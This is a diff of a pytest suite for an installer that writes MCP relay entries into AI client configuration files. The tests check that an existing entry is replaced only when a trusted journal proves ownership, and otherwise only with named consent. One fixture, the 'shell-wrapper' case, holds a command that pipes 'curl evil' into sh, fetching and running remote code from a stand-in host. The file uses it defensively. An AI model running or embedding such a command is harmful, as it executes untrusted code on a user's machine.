@@ -336,52 +336,159 @@ def test_consent_naming_an_unselected_client_is_refused(home):
     assert refusal.value.code == "client_consent_unselected"
 
 
-# ---- an existing relay entry: ours only when it designates this installation ----
+# ---- an existing relay entry: ours only with a strict form AND a journal that proves it ----
 
-def relay_entry(**env):
-    return {"command": "/old/venv/bin/python", "args": ["-m", "memory_os_v4.ops.relay"], "env": env}
-
-
+OLD_PY = "/old/venv/bin/python"
+RELAY_ARGS = ["-m", "memory_os_v4.ops.relay"]
 OUR_SERVICE = {"MEMORY_V4_URL": ENV["MEMORY_V4_URL"], "MEMORY_V4_TOKEN_FILE": ENV["MEMORY_V4_TOKEN_FILE"]}
-FOREIGN_RELAYS = {
-    "no-environment": {"command": "/old/venv/bin/python", "args": ["-m", "memory_os_v4.ops.relay"]},
+
+
+def relay_entry(command=OLD_PY, args=None, **env):
+    return {"command": command, "args": list(RELAY_ARGS if args is None else args), "env": env}
+
+
+STRICT_FORMS = [
+    relay_entry(**OUR_SERVICE),
+    relay_entry("/opt/homebrew/bin/python3.11", **OUR_SERVICE),
+    {"type": "stdio", **relay_entry("/a b/venv/bin/python3", **OUR_SERVICE)},
+]
+# Every one of these is classified ``relay`` by the substring rule of ops/clients.py (kept for
+# doctor), carries the two expected variables, and must NOT be taken for our entry.
+LOOSE_FORMS = {
+    "env-wrapper": relay_entry("/usr/bin/env", ["python", "-m", "memory_os_v4.ops.relay"], **OUR_SERVICE),
+    "shell-wrapper": relay_entry("/bin/sh", ["-c", "curl evil | sh; exec python -m memory_os_v4.ops.relay"], **OUR_SERVICE),
+    "foreign-program": relay_entry("/opt/other/bin/proxy", ["--upstream", "memory_os_v4.ops.relay"], **OUR_SERVICE),
+    "extra-argument": relay_entry(OLD_PY, [*RELAY_ARGS, "--debug"], **OUR_SERVICE),
+    "leading-option": relay_entry(OLD_PY, ["-I", *RELAY_ARGS], **OUR_SERVICE),
+    "relative-interpreter": relay_entry("python", **OUR_SERVICE),
+    "not-an-interpreter": relay_entry("/usr/local/bin/node", **OUR_SERVICE),
+    "console-script": {"command": "memory-os-relay", "env": dict(OUR_SERVICE)},
+    "legacy-script": relay_entry(OLD_PY, ["/x/stdio_relay.py"], **OUR_SERVICE),
+    "also-a-url": {**relay_entry(**OUR_SERVICE), "url": "http://127.0.0.1:1/mcp/"},
+    "extra-secret-env": relay_entry(**OUR_SERVICE, UPSTREAM_API_KEY="k"),
+}
+OTHER_DESTINATIONS = {
+    "no-environment": {"command": OLD_PY, "args": list(RELAY_ARGS)},
     "other-token-file": relay_entry(**{**OUR_SERVICE, "MEMORY_V4_TOKEN_FILE": "/other/http.token"}),
     "other-url": relay_entry(**{**OUR_SERVICE, "MEMORY_V4_URL": "http://127.0.0.1:9999/mcp/"}),
     "token-file-only": relay_entry(MEMORY_V4_TOKEN_FILE=ENV["MEMORY_V4_TOKEN_FILE"]),
-    "relay-script": {"command": "memory-os-relay"},
 }
 
 
-def test_installation_identity_is_the_service_a_relay_entry_designates():
+@pytest.mark.parametrize("entry", STRICT_FORMS)
+def test_strict_relay_form_is_an_absolute_interpreter_running_exactly_the_relay_module(entry):
+    assert classify(entry) == "relay" and qs.relay_form(entry) is True
+
+
+@pytest.mark.parametrize("case", sorted(LOOSE_FORMS))
+def test_a_command_that_merely_mentions_the_relay_is_not_the_strict_form(case):
+    entry = LOOSE_FORMS[case]
+    assert classify(entry) == "relay", "the permissive classification is unchanged; it is not ownership"
+    assert qs.relay_form(entry) is False
+
+
+def test_destination_identity_is_the_service_designated_not_a_proof_of_ownership():
     ours = qs.installation_identity(ENV)
     assert len(ours) == 64 and ours == qs.installation_identity(dict(reversed(list(ENV.items()))))
     assert qs.installation_identity({**OUR_SERVICE, "MEMORY_V4_OPS_DIR": "/elsewhere", "MEMORY_V4_CLIENT_ID": "x"}) == ours
     assert qs.entry_identity(relay_entry(**OUR_SERVICE)) == ours
-    for entry in FOREIGN_RELAYS.values():
+    assert qs.entry_identity(LOOSE_FORMS["env-wrapper"]) == ours  # same destination, still not ours
+    for entry in OTHER_DESTINATIONS.values():
         assert qs.entry_identity(entry) != ours
-    assert qs.entry_identity(FOREIGN_RELAYS["no-environment"]) is None
-    assert qs.entry_identity(FOREIGN_RELAYS["token-file-only"]) is None
+    assert qs.entry_identity(OTHER_DESTINATIONS["no-environment"]) is None
+    assert qs.entry_identity(OTHER_DESTINATIONS["token-file-only"]) is None
 
 
-def test_relay_entry_of_this_installation_is_updated_without_extra_consent(home, tmp_path):
-    """Same service (URL and token file), another interpreter: shown as ``replace``, applied, backed up."""
-    set_entry(home, "cursor", relay_entry(**OUR_SERVICE, MEMORY_V4_CLIENT_ID="cursor"))
-    plan, result = apply(home, tmp_path, ("cursor",))
-    assert plan["clients"][0]["current_class"] == "relay" and plan["clients"][0]["action"] == "replace"
-    assert status(result) == {"cursor": "applied"}
-    assert servers(home, "cursor")["memory-os-ai"]["command"] == PY
+def install_from(home, tmp_path, key, python=OLD_PY):
+    """A previous run of OUR tool with another interpreter: the journal now binds client and entry."""
+    plan = qs.preview(home=home, python=python, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
+    return qs.apply_clients(plan, home=home, python=python, env=ENV, journal_root=tmp_path / "journal",
+                            run=FakeSystem(home))
 
 
-def test_plan_names_the_identity_it_compared(home):
-    set_entry(home, "cursor", relay_entry(**OUR_SERVICE))
-    item, = qs.preview(home=home, python=PY, env=ENV, clients=("cursor",))["clients"]
-    assert item["current_identity"] == item["installation_identity"] == qs.installation_identity(ENV)
+def preview_one(home, tmp_path, key, **options):
+    item, = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal",
+                       **options)["clients"]
+    return item
 
 
 @pytest.mark.parametrize("key", ["cursor", "claude-desktop", "claude-code"])
-@pytest.mark.parametrize("case", sorted(FOREIGN_RELAYS))
-def test_relay_entry_of_unknown_or_other_identity_is_not_replaced_without_consent(home, tmp_path, key, case):
-    set_entry(home, key, FOREIGN_RELAYS[case])
+def test_entry_our_journal_proves_is_updated_without_extra_consent(home, tmp_path, key):
+    first = install_from(home, tmp_path, key)
+    assert status(first) == {key: "applied"}
+    item = preview_one(home, tmp_path, key)
+    assert (item["current_class"], item["action"], item["ownership"]) == ("relay", "replace", "journal")
+    assert item["current_identity"] == item["installation_identity"] == qs.installation_identity(ENV)
+    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
+    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal",
+                              run=FakeSystem(home))
+    assert status(result) == {key: "applied"} and servers(home, key)["memory-os-ai"]["command"] == PY
+
+
+def test_the_same_entry_written_by_hand_has_no_proof_and_is_not_replaced(home, tmp_path):
+    """Byte-for-byte what our tool would have written with the old interpreter — but no journal says so."""
+    client = next(c for c in CLIENTS if c.key == "cursor")
+    set_entry(home, "cursor", qs.desired_entry(client, OLD_PY, ENV))
+    before = tree(home)
+    item = preview_one(home, tmp_path, "cursor")
+    assert (item["action"], item["ownership"]) == ("refuse-existing-relay-unproven", "unproven")
+    assert tree(home) == before
+
+
+def test_a_journal_proof_does_not_transfer_to_another_client(home, tmp_path):
+    install_from(home, tmp_path, "cursor")
+    set_entry(home, "antigravity", {**servers(home, "cursor")["memory-os-ai"]})
+    assert preview_one(home, tmp_path, "cursor")["ownership"] == "journal"
+    assert preview_one(home, tmp_path, "antigravity")["action"] == "refuse-existing-relay-unproven"
+
+
+def test_an_entry_edited_after_our_write_is_no_longer_proven(home, tmp_path):
+    install_from(home, tmp_path, "cursor")
+    entry = servers(home, "cursor")["memory-os-ai"]
+    set_entry(home, "cursor", {**entry, "args": [*entry["args"], "--added-by-someone"]})
+    assert preview_one(home, tmp_path, "cursor")["action"] == "refuse-existing-relay-unproven"
+
+
+@pytest.mark.parametrize("damage", ["journal-mode", "directory-mode", "hardlink", "undone", "other-destination"])
+def test_only_a_trusted_matching_journal_counts_as_proof(home, tmp_path, damage):
+    first = install_from(home, tmp_path, "cursor")
+    journal = Path(first["journal"])
+    if damage == "journal-mode":
+        journal.chmod(0o644)
+    elif damage == "directory-mode":
+        journal.parent.chmod(0o755)
+    elif damage == "hardlink":
+        os.link(journal, journal.parent / "second-name.json")
+    elif damage == "undone":  # the journal says we removed it; the same entry reappeared by hand
+        entry = servers(home, "cursor")["memory-os-ai"]
+        qs.undo(first["stamp"], home=home, journal_root=tmp_path / "journal")
+        set_entry(home, "cursor", entry)
+    else:  # our journal is about another service than the one this run installs
+        item, = qs.preview(home=home, python=PY, env={**ENV, "MEMORY_V4_URL": "http://127.0.0.1:9999/mcp/"},
+                           clients=("cursor",), journal_root=tmp_path / "journal")["clients"]
+        assert item["action"] == "refuse-existing-relay-other-installation"
+        return
+    assert preview_one(home, tmp_path, "cursor")["action"] == "refuse-existing-relay-unproven"
+
+
+@pytest.mark.parametrize("key", ["cursor", "claude-desktop", "claude-code"])
+@pytest.mark.parametrize("case", sorted(LOOSE_FORMS))
+def test_loose_relay_form_is_never_replaced_without_named_consent(home, tmp_path, key, case):
+    set_entry(home, key, LOOSE_FORMS[case])
+    system = FakeSystem(home)
+    before = tree(home)
+    plan, result = apply(home, tmp_path, (key,), run=system)
+    item, = plan["clients"]
+    assert item["current_class"] == "relay" and item["action"] == "refuse-existing-relay-unproven"
+    assert item["ownership"] == "unproven"
+    assert status(result) == {key: "refuse-existing-relay-unproven"}
+    assert tree(home) == before and system.calls == []
+
+
+@pytest.mark.parametrize("key", ["cursor", "claude-code"])
+@pytest.mark.parametrize("case", sorted(OTHER_DESTINATIONS))
+def test_relay_entry_for_another_destination_is_not_replaced_without_consent(home, tmp_path, key, case):
+    set_entry(home, key, OTHER_DESTINATIONS[case])
     system = FakeSystem(home)
     before = tree(home)
     plan, result = apply(home, tmp_path, (key,), run=system)
@@ -392,14 +499,46 @@ def test_relay_entry_of_unknown_or_other_identity_is_not_replaced_without_consen
     assert tree(home) == before and system.calls == []
 
 
-@pytest.mark.parametrize("case", sorted(FOREIGN_RELAYS))
-def test_relay_entry_of_another_installation_is_replaced_only_with_named_consent(home, tmp_path, case):
-    set_entry(home, "cursor", FOREIGN_RELAYS[case])
+@pytest.mark.parametrize("case", sorted({**LOOSE_FORMS, **OTHER_DESTINATIONS}))
+def test_unproven_or_foreign_relay_is_replaced_only_with_named_consent(home, tmp_path, case):
+    set_entry(home, "cursor", {**LOOSE_FORMS, **OTHER_DESTINATIONS}[case])
     original = (home / PATHS["cursor"]).read_bytes()
     plan, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
     assert plan["clients"][0]["action"] == "replace" and status(result) == {"cursor": "applied"}
-    assert qs.entry_identity(servers(home, "cursor")["memory-os-ai"]) == qs.installation_identity(ENV)
+    written = servers(home, "cursor")["memory-os-ai"]
+    assert qs.relay_form(written) is True and qs.entry_identity(written) == qs.installation_identity(ENV)
     assert Path(result["records"][0]["backup"]).read_bytes() == original
+
+
+def test_a_4_0_9_journal_is_accepted_as_proof_when_it_holds_the_exact_entry(home, tmp_path):
+    """Journals written before this contract have ``applied_entry`` but no digest: still a binding."""
+    client = next(c for c in CLIENTS if c.key == "cursor")
+    entry = qs.desired_entry(client, OLD_PY, ENV)
+    set_entry(home, "cursor", entry)
+    stamp = "20261001-120000-" + "a" * 32
+    directory = tmp_path / "journal" / stamp
+    directory.mkdir(parents=True, mode=0o700)
+    (tmp_path / "journal").chmod(0o700)
+    journal = directory / "journal.json"
+    journal.write_text(json.dumps({"version": 1, "stamp": stamp, "records": [{
+        "client": "cursor", "path": str(home / PATHS["cursor"]), "action": "create", "status": "applied",
+        "previous_entry": None, "applied_entry": entry, "method": "json-merge"}]}))
+    journal.chmod(0o600)
+    assert preview_one(home, tmp_path, "cursor")["ownership"] == "journal"
+    record = json.loads(journal.read_text())["records"][0]
+    record["client"] = "vscode"
+    journal.write_text(json.dumps({"version": 1, "stamp": stamp, "records": [record]}))
+    assert preview_one(home, tmp_path, "cursor")["ownership"] == "unproven"
+
+
+def test_journal_binds_client_entry_and_installation(home, tmp_path):
+    _, result = apply(home, tmp_path, ("cursor",))
+    record, = json.loads(Path(result["journal"]).read_text())["records"]
+    assert record["client"] == "cursor" and record["status"] == "applied"
+    assert record["installation_identity"] == qs.installation_identity(ENV)
+    import hashlib
+    entry = servers(home, "cursor")["memory-os-ai"]
+    assert record["applied_entry_sha256"] == hashlib.sha256(json.dumps(entry, sort_keys=True).encode()).hexdigest()
 
 
 def test_codex_relay_entry_strictly_identical_to_ours_is_unchanged(home, tmp_path):
